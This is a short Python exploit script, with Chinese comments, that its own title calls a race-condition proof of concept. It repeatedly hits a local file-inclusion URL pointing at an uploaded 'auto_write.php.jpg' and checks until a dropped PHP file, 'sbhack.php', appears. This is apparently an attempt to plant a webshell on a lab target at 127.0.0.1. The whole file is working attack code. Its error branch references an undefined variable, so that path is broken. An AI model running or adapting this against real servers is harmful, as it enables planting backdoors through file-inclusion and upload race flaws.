import requests     # HTTP操作模块
#import tkinter as tk       #窗口模块

 # requests.get('http://httpbin.org/post')
 # requests.post('http://httpbin.org/post')
 # requests.put('http://httpbin.org/put')
 # requests.delete('http://httpbin.org/delete')
 # requests.head('http://httpbin.org/get')
 # requests.options('http://httpbin.org/get')
#root = tk.Tk()
#root.title("forGET_条件竞争漏洞_POC&exp")


url = 'http://127.0.0.1/include.php?file=/upload/auto_write.php.jpg'
url_2 = 'http://127.0.0.1/sbhack.php'
#head = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36'
head = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Accept-Encoding": "gzip, deflate",
    "Accept": "*/*",
    "Connection": "keep-alive"
}


# 循环--次数
for i in range(1, 99999):
    tmp_request = requests.get(url,headers = head,timeout=5)
    tmp_request2 = requests.get(url_2,headers = head,timeout=5)
    if tmp_request2.status_code == 404:
        print(str(i) + ' ---- ' + 'Failed' + ' ---- ' + str(tmp_request2.status_code) + ' ---- ' + url_2)
    elif tmp_request2.status_code == 200:
        print('\n' + 'Sucess!' + '\n')
        print(url_2 + ' ---- ' + str(tmp_request2.status_code))
        break
    else:
        print('\n' + '未知错误!' + '\n')
        print('url_1:' + url_1 + ' ---- ' + str(tmp_request.status_code))
        print('url_2:' + url_2 + ' ---- ' + str(tmp_request2.status_code))
        break 

# 等待用户输入,按任意键退出！
input("按回车键退出！Press Enter to exit...")

